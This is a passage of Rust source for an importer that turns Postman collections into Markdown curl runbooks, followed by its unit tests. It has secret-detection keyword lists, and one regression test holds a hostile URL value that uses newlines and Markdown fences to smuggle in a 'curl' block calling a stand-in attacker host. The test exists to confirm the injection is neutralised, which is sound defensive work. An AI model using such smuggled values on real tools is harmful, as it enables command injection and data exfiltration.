        &mut self,
        args: &mut Vec<String>,
        value: Option<&Value>,
        flag: &str,
        pointer: &str,
    ) {
        let Some(entries) = value.and_then(Value::as_array) else {
            return;
        };
        for (index, entry) in entries.iter().enumerate() {
            let entry_pointer = format!(
                "{pointer}/{}",
                if flag == "--form" {
                    "formdata"
                } else {
                    "urlencoded"
                }
            );
            let entry_pointer = format!("{entry_pointer}/{index}");
            let Some(object) = entry.as_object() else {
                self.issue(
                    "MDOK-PM-BODY",
                    IssueSeverity::Error,
                    "body field must be an object",
                    entry_pointer,
                );
                continue;
            };
            if object.get("disabled").and_then(Value::as_bool) == Some(true) {
                continue;
            }
            if object.get("type").and_then(Value::as_str) == Some("file") {
                self.issue(
                    "MDOK-PM-BODY-FILE",
                    IssueSeverity::Error,
                    "multipart file fields require an explicit reviewed artifact mapping",
                    entry_pointer,
                );
                continue;
            }
            let Some(key) = object.get("key").and_then(Value::as_str) else {
                self.issue(
                    "MDOK-PM-BODY",
                    IssueSeverity::Error,
                    "body field has no key",
                    entry_pointer,
                );
                continue;
            };
            let value = object
                .get("value")
                .and_then(Value::as_str)
                .unwrap_or_default();
            let value = self.render_value(key, value, "raw", &entry_pointer);
            let mut rendered = format!("{key}={value}");
            if flag == "--form"
                && let Some(content_type) = object
                    .get("contentType")
                    .and_then(Value::as_str)
                    .map(str::trim)
                    .filter(|content_type| !content_type.is_empty())
            {
                rendered.push_str(&format!(";type={content_type}"));
            }
            args.push(flag.to_owned());
            args.push(quote_arg(&self.defer_value(&rendered, pointer)));
        }
    }

    fn lower_behavior(&mut self, args: &mut Vec<String>, context: &Context, pointer: &str) {
        if context
            .behavior
            .get("followRedirects")
            .and_then(Value::as_bool)
            == Some(false)
        {
            args.push("--max-redirs".to_owned());
            args.push("0".to_owned());
        } else if let Some(max) = context.behavior.get("maxRedirects").and_then(Value::as_u64) {
            args.push("--max-redirs".to_owned());
            args.push(max.to_string());
        }
        if context.behavior.get("strictSSL").and_then(Value::as_bool) == Some(false) {
            self.issue(
                "MDOK-PM-TLS",
                IssueSeverity::Error,
                "strictSSL=false cannot be lowered without an explicit MDOK policy override",
                pointer,
            );
        }
        if context
            .behavior
            .get("disableCookies")
            .and_then(Value::as_bool)
            == Some(true)
        {
            self.issue(
                "MDOK-PM-COOKIES",
                IssueSeverity::Error,
                "Postman disabled cookies; MDOK currently has no per-request cookie-disable switch",
                pointer,
            );
        }
    }

    fn normalize_template(&mut self, input: &str, filter: &str, pointer: &str) -> String {
        let mut output = String::with_capacity(input.len());
        let mut cursor = 0;
        while let Some(start_rel) = input[cursor..].find("{{") {
            let start = cursor + start_rel;
            output.push_str(&input[cursor..start]);
            let Some(end_rel) = input[start + 2..].find("}}") else {
                self.issue(
                    "MDOK-PM-TEMPLATE",
                    IssueSeverity::Error,
                    "unclosed Postman variable template",
                    pointer,
                );
                output.push_str(&input[start..]);
                return output;
            };
            let end = start + 2 + end_rel;
            let name = input[start + 2..end].trim();
            if name.starts_with('$') {
                self.issue(
                    "MDOK-PM-DYNAMIC",
                    IssueSeverity::Error,
                    format!("dynamic Postman variable {name:?} has no deterministic MDOK source"),
                    pointer,
                );
                output.push_str(&input[start..=end + 1]);
            } else if name.contains('|') {
                if looks_secret(name.split('|').next().unwrap_or_default().trim()) {
                    self.secret_variables
                        .insert(name.split('|').next().unwrap_or_default().trim().to_owned());
                }
                output.push_str(&format!("{{{{{name}}}}}"));
            } else {
                if looks_secret(name) {
                    self.secret_variables.insert(name.to_owned());
                }
                output.push_str(&format!("{{{{{name}|{filter}}}}}"));
            }
            cursor = end + 2;
        }
        output.push_str(&input[cursor..]);
        output
    }

    fn translate_scripts(
        &mut self,
        scripts: &[String],
        pointer: &str,
    ) -> (Vec<String>, Vec<String>) {
        let mut checks = Vec::new();
        let mut capture_fields = Vec::new();
        for (index, script) in scripts.iter().enumerate() {
            let script_pointer = format!("{pointer}/event/{index}/script");
            let mut script_checks = Vec::new();
            for raw_line in script.lines() {
                let line = raw_line.trim().trim_end_matches(';').trim();
                if line.is_empty()
                    || line.starts_with("//")
                    || line.starts_with("pm.test(")
                    || line == "});"
                    || line == "})"
                    || line == "{"
                    || line == "}"
                    || line.contains("function")
                    || line.starts_with("const ")
                    || line.starts_with("let ")
                    || line.starts_with("var ")
                {
                    continue;
                }
                if let Some(status) = parse_status_assertion(line) {
                    script_checks.push(format!("status == {}", jmes_number(&status)));
                    continue;
                }
                if let Some(header) = parse_header_assertion(line) {
                    let header = header.to_ascii_lowercase();
                    script_checks.push(format!(
                        "length(headers.{}) > {}",
                        jmes_path_component(&header),
                        jmes_number("0")
                    ));
                    continue;
                }
                if let Some((path, expected)) = parse_body_assertion(line) {
                    script_checks.push(format!("body.{path} == {expected}"));
                    continue;
                }
                if let Some((name, path)) = parse_capture(line) {
                    capture_fields.push(format!("{name}: body.{path}"));
                    continue;
                }
                self.issue(
                    "MDOK-PM-JS",
                    IssueSeverity::Error,
                    format!("Postman JavaScript statement is not translatable: {line}"),
                    script_pointer.clone(),
                );
            }
            if !script_checks.is_empty() {
                checks.push(script_checks.join("\n"));
            }
        }
        let captures = if capture_fields.is_empty() {
            Vec::new()
        } else {
            vec![format!("{{{}}}", capture_fields.join(", "))]
        };
        (checks, captures)
    }
}

fn folder_path_key(prefix: &[String], name: &str) -> String {
    if prefix.is_empty() {
        name.to_owned()
    } else {
        format!("{}/{}", prefix.join("/"), name)
    }
}

/// Extract human-readable description text from a Postman description value
/// (a plain string or the v2.1 object form `{content, type, version}`).
fn description_text(value: Option<&Value>) -> Option<String> {
    let text: Option<String> = match value {
        Some(Value::String(text)) => Some(text.clone()),
        Some(Value::Object(object)) => object
            .get("content")
            .and_then(Value::as_str)
            .map(str::to_owned),
        _ => None,
    };
    text.map(|text| markdown_heading(&text)).filter(|text| !text.is_empty())
}

fn script_source(event: &Value) -> Option<String> {
    let exec = event.get("script")?.get("exec")?;
    match exec {
        Value::String(source) => Some(source.clone()),
        Value::Array(lines) => Some(
            lines
                .iter()
                .filter_map(Value::as_str)
                .collect::<Vec<_>>()
                .join("\n"),
        ),
        _ => None,
    }
}

fn value_as_string(value: &Value) -> Option<String> {
    match value {
        Value::String(value) => Some(value.clone()),
        Value::Bool(value) => Some(value.to_string()),
        Value::Number(value) => Some(value.to_string()),
        _ => None,
    }
}

fn looks_secret(name: &str) -> bool {
    let normalized = name.to_ascii_lowercase().replace(['-', '.'], "_");
    [
        "secret",
        "password",
        "passwd",
        "token",
        "api_key",
        "apikey",
        "authorization",
        "cookie",
        "set_cookie",
        "credential",
        "private_key",
        "client_secret",
    ]
    .iter()
    .any(|marker| normalized.contains(marker))
}

fn sensitive_header(name: &str) -> bool {
    matches!(
        name.to_ascii_lowercase().as_str(),
        "authorization"
            | "proxy-authorization"
            | "cookie"
            | "set-cookie"
            | "x-api-key"
            | "x-auth-token"
    ) || looks_secret(name)
}

fn raw_body_looks_sensitive(body: &str) -> bool {
    let lower = body.to_ascii_lowercase();
    [
        "\"password\"",
        "\"passwd\"",
        "\"token\"",
        "\"api_key\"",
        "\"apikey\"",
        "\"secret\"",
        "\"authorization\"",
        "\"private_key\"",
        "\"client_secret\"",
    ]
    .iter()
    .any(|marker| lower.contains(marker))
}

fn sanitize_name(name: &str) -> String {
    let mut result = String::new();
    for character in name.chars() {
        if character.is_ascii_alphanumeric() || character == '_' || character == '-' {
            result.push(character.to_ascii_lowercase());
        } else if !result.ends_with('_') {
            result.push('_');
        }
    }
    let result = result.trim_matches('_').to_owned();
    if result.is_empty() {
        "request".to_owned()
    } else {
        result
    }
}

fn replace_colon_path_parameters(input: &str) -> String {
    let split_at = input.find(['?', '#']).unwrap_or(input.len());
    let (path, suffix) = input.split_at(split_at);
    let mut output = String::with_capacity(input.len());
    for (index, segment) in path.split('/').enumerate() {
        if index > 0 {
            output.push('/');
        }
        if let Some(name) = segment.strip_prefix(':')
            && !name.is_empty()
            && name
                .chars()
                .all(|character| character.is_ascii_alphanumeric() || character == '_')
        {
            write!(output, "{{{{{name}|url}}}}").unwrap();
        } else {
            output.push_str(segment);
        }
    }
    output.push_str(suffix);
    output
}

fn markdown_heading(value: &str) -> String {
    value.replace(['\n', '\r'], " ").trim().to_owned()
}

fn toml_string(value: &str) -> String {
    format!(
        "\"{}\"",
        value
            .replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n")
            .replace('\r', "\\r")
    )
}

fn quote_arg(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

fn common_prefix_len(left: &[String], right: &[String]) -> usize {
    left.iter()
        .zip(right)
        .take_while(|(left, right)| left == right)
        .count()
}

fn jmes_number(value: &str) -> String {
    let value = value.trim();
    if value.chars().all(|character| character.is_ascii_digit()) {
        format!("{}{}{}", char::from(96), value, char::from(96))
    } else {
        jmes_string(value)
    }
}

fn jmes_string(value: &str) -> String {
    format!("'{}'", value.replace('\'', "\\'"))
}

fn jmes_path_component(value: &str) -> String {
    if value
        .chars()
        .all(|character| character.is_ascii_alphanumeric() || character == '_')
    {
        format!("\"{value}\"")
    } else {
        format!("[{value:?}]")
    }
}

fn parse_status_assertion(line: &str) -> Option<String> {
    for marker in [
        "pm.response.to.have.status(",
        "pm.response.code).to.eql(",
        "pm.response.code).to.equal(",
    ] {
        if let Some(start) = line.find(marker) {
            let rest = &line[start + marker.len()..];
            let end = rest.find(')')?;
            let status = rest[..end].trim();
            if status.chars().all(|character| character.is_ascii_digit()) {
                return Some(status.to_owned());
            }
        }
    }
    None
}

fn parse_header_assertion(line: &str) -> Option<String> {
    let marker = "pm.response.to.have.header(";
    let start = line.find(marker)? + marker.len();
    let rest = &line[start..];
    let quote = rest.chars().next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let end = rest[1..].find(quote)? + 1;
    Some(rest[1..end].to_owned())
}

fn parse_body_assertion(line: &str) -> Option<(String, String)> {
    let prefix = "pm.expect(pm.response.json().";
    let start = line.find(prefix)? + prefix.len();
    let remainder = &line[start..];
    let split = remainder
        .find(").to.eql(")
        .or_else(|| remainder.find(").to.equal("))?;
    let path = remainder[..split].trim();
    if path.is_empty()
        || !path.chars().all(|character| {
            character.is_ascii_alphanumeric() || character == '_' || character == '.'
        })
    {
        return None;
    }
    let expected_start = split
        + if remainder[split..].starts_with(").to.eql(") {
            ").to.eql(".len()
        } else {
            ").to.equal(".len()
        };
    let expected = remainder[expected_start..].trim_end_matches(')').trim();
    let expected = serde_json::from_str::<Value>(expected)
        .ok()
        .map(|value| match value {
            Value::String(value) => jmes_string(&value),
            Value::Number(value) => jmes_number(&value.to_string()),
            Value::Bool(value) => value.to_string(),
            Value::Null => "null".to_owned(),
            _ => String::new(),
        })
        .filter(|value| !value.is_empty())?;
    Some((path.to_owned(), expected))
}

fn parse_capture(line: &str) -> Option<(String, String)> {
    let scopes = [
        "pm.environment.set(",
        "pm.collectionVariables.set(",
        "pm.variables.set(",
        "pm.globals.set(",
    ];
    let marker = scopes.iter().find(|marker| line.contains(**marker))?;
    let start = line.find(*marker)? + marker.len();
    let rest = &line[start..];
    let quote = rest.chars().next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let name_end = rest[1..].find(quote)? + 1;
    let name = sanitize_name(&rest[1..name_end]);
    let source_marker = "pm.response.json().";
    let source_start = rest.find(source_marker)? + source_marker.len();
    let path = rest[source_start..]
        .trim_end_matches(')')
        .trim()
        .trim_end_matches(';')
        .to_owned();
    if path.is_empty()
        || !path.chars().all(|character| {
            character.is_ascii_alphanumeric() || character == '_' || character == '.'
        })
    {
        return None;
    }
    Some((name, path))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn collection(items: Value) -> Vec<u8> {
        serde_json::json!({
            "info": {
                "name": "Example API",
                "schema": POSTMAN_COLLECTION_V2_1_SCHEMA
            },
            "variable": [
                {"key": "base_url", "value": "https://api.example.test"},
                {"key": "api_token", "value": "do-not-print"}
            ],
            "item": items
        })
        .to_string()
        .into_bytes()
    }

    /// F4b regression: a Postman value containing a newline + Markdown fence
    /// delimiters must not break out of the curl command fence and inject an
    /// executable block. After the fix, attacker values are deferred into the
    /// toml vars block and referenced via `{{mdok_pm_arg_N|raw}}`.
    #[test]
    fn fence_injection_is_neutralized() {
        let evil = serde_json::json!({
            "info": {"name": "Col", "schema": POSTMAN_COLLECTION_V2_1_SCHEMA},
            "item": [{
                "name": "r2",
                "request": {
                    "method": "GET",
                    "url": "x\n```\n\n```curl mdok name=exfil\ncurl https://attacker.example.test/\n```\n"
                }
            }]
        })
        .to_string()
        .into_bytes();
        let output =
            import_collection_bytes(&evil, None::<&Path>, &ImportOptions::default()).unwrap();
        // The generated markdown must contain exactly one curl fence (the real
        // request), not the smuggled `exfil` block.
        let curl_fences = output
            .markdown
            .lines()
            .filter(|line| line.starts_with("```curl"))
            .count();
        assert_eq!(
            curl_fences, 1,
            "expected exactly one curl fence; got {curl_fences}\n--- markdown ---\n{}",
            output.markdown
        );
        // The dangerous payload must live only inside the toml vars block
        // (escaped), not as a live fence.
        assert!(!output.markdown.contains("name=exfil\n"));
    }

    #[test]
    fn imports_request_query_body_and_tests() {
        let bytes = collection(serde_json::json!([
            {
                "name": "Users",
                "item": [{
                    "name": "List users",
                    "request": {
                        "method": "POST",
                        "url": {
                            "raw": "{{base_url}}/users/:user?enabled=true&skip=1",
                            "query": [
                                {"key": "enabled", "value": "true"},
                                {"key": "skip", "value": "1", "disabled": true}
                            ]
                        },
                        "header": [{"key": "X-Request", "value": "{{api_token}}"}],
                        "body": {"mode": "raw", "raw": "{\"name\":\"Ada\"}"}
                    },
                    "event": [{
                        "listen": "test",
                        "script": {"exec": ["pm.response.to.have.status(201);", "pm.environment.set(\"user_id\", pm.response.json().id);"]}
                    }]
                }]
            }
        ]));
        let output =
            import_collection_bytes(&bytes, None::<&Path>, &ImportOptions::default()).unwrap();
        assert!(!output.has_blockers());
        assert!(output.markdown.contains("enabled=true"));
        assert!(output.markdown.contains("{{user|url}}"));
        assert!(!output.markdown.contains("skip=1"));
        assert!(output.markdown.contains("X-Request"));
        assert!(output.markdown.contains("api_token"));
        assert!(output.markdown.contains(&format!(
            "status == {}201{}",
            char::from(96),
            char::from(96)
        )));
        assert!(output.markdown.contains("{user_id: body.id}"));
        assert!(
            output
                .manifest
                .secret_variables
                .contains(&"api_token".to_owned())
        );
    }

    #[test]
    fn prerequest_script_is_a_blocker() {
        let bytes = collection(serde_json::json!([{
            "name": "Health",
            "request": "https://example.test/health",
            "event": [{"listen": "prerequest", "script": {"exec": ["pm.variables.set(\"x\", \"y\");"]}}]
        }]));
        let output =
            import_collection_bytes(&bytes, None::<&Path>, &ImportOptions::default()).unwrap();
        assert!(output.has_blockers());
        assert!(
            output
                .manifest
                .issues
                .iter()
                .any(|issue| issue.code == "MDOK-PM-PREREQUEST")
        );
    }

    #[test]
    fn lowers_basic_auth_and_raw_template_values_without_leaking_secrets() {
        let bytes = collection(serde_json::json!([{
            "name": "Create",
            "request": {
                "method": "POST",
                "url": "{{base_url}}/users",
                "auth": {
                    "type": "basic",
                    "basic": [
                        {"key": "username", "value": "alice"},
                        {"key": "password", "value": "{{password}}"}
                    ]
                },
                "body": {"mode": "raw", "raw": "{\"name\":\"{{display_name}}\"}"}
            }
        }]));
        let output =
            import_collection_bytes(&bytes, None::<&Path>, &ImportOptions::default()).unwrap();
        assert!(!output.has_blockers());
        // After F4b, attacker-controlled values are deferred into the toml vars
        // block and referenced via `{{mdok_pm_arg_N|raw}}` in the fence body, so
        // the basic-auth `--user` value is no longer inlined verbatim.
        assert!(
            output.markdown.contains("--user '{{mdok_pm_arg_"),
            "expected deferred --user reference, got: {}",
            output.markdown
        );
        assert!(!output.markdown.contains("'alice:"));
        // The raw body value (which contains the {{display_name}} template) is
        // also deferred into the vars block after F4b; verify it lands there.
        assert!(
            output.markdown.contains("{{display_name|raw}}"),
            "expected display_name template in vars block, got: {}",
            output.markdown
        );
        assert!(!output.markdown.contains("do-not-print"));
        assert!(
            output
                .manifest
                .secret_variables
                .contains(&"password".to_owned())
        );
    }

    #[test]
    fn replaces_literal_secret_headers_and_raw_body_values() {
        let bytes = collection(serde_json::json!([{
            "name": "Secret",
            "request": {
                "method": "POST",
                "url": "https://example.test/secret",
                "header": [{"key": "X-Api-Key", "value": "literal-api-key"}],
                "body": {"mode": "raw", "raw": "{\"password\":\"literal-password\"}"}
            }
        }]));
        let output =
            import_collection_bytes(&bytes, None::<&Path>, &ImportOptions::default()).unwrap();
        assert!(output.has_blockers());
        assert!(!output.markdown.contains("literal-api-key"));
        assert!(!output.markdown.contains("literal-password"));
        assert!(
            output
                .manifest
                .issues
                .iter()
                .filter(|issue| issue.code == "MDOK-PM-SECRET")
                .count()
                >= 2
        );
    }

    #[test]
    fn rejects_v3_schema() {
        let bytes = serde_json::json!({
            "info": {"name": "v3", "schema": "https://schema.getpostman.com/json/collection/v3.0.0/collection.json"},
            "item": []
        })
        .to_string();
        let error =
            import_collection_bytes(bytes.as_bytes(), None::<&Path>, &ImportOptions::default())
                .unwrap_err();
        assert!(error.to_string().contains("only Postman Collection v2.1"));
    }
}
